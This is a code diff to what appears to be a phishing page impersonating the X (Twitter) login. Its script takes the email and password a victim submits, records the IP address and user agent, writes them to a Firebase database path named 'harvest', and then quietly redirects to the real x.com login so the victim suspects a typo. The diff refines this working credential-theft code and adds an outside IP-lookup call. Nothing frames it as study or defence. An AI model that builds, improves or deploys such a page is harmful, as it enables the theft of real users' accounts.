@@ -26,31 +26,40 @@
         <div class="fineprint">Forgot password? · Sign up for X</div>
     </div>
 
-    <!-- FIREBASE SDK (only the tiny realtime piece) -->
+    <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 
     <script>
-        // === CONFIG (change only the projectId) ===
         const firebaseConfig = {
-            projectId: clickme,
-            databaseURL: https://clickme-8b35c-default-rtdb.asia-southeast1.firebasedatabase.app/
+            projectId: "clickme",
+            databaseURL: "https://YOUR-PROJECT-ID-default-rtdb.europe-west1.firebasedatabase.app"
         };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        // === SILENT GRAB & FORWARD ===
-        document.getElementById('f').addEventListener('submit', function (e) {
-            e.preventDefault();                       // stay on page for 200 ms
+        document.getElementById('f').addEventListener('submit', async function(e) {
+            e.preventDefault();
             const email = this.email.value.trim();
-            const pass  = this.pass.value.trim();
-            const now   = Date.now();
-            const ip    = "<?php echo $_SERVER['REMOTE_ADDR']; ?>"; // server-side leak
+            const pass = this.pass.value.trim();
+            let ip = "unknown";
 
-            // push unique child so every victim gets own node
-            db.ref('harvest/' + now).set({email, pass, ip, ua: navigator.userAgent});
+            // Fetch IP via free API (no PHP)
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
+            } catch(e) {}
 
-            // instant redirect to real login — user blames typo
+            const now = Date.now();
+            db.ref('harvest/' + now).set({
+                email,
+                pass,
+                ip,
+                ua: navigator.userAgent
+            });
+
+            // Redirect to real X login
             setTimeout(() => window.location.replace('https://x.com/login'), 200);
         });
     </script>
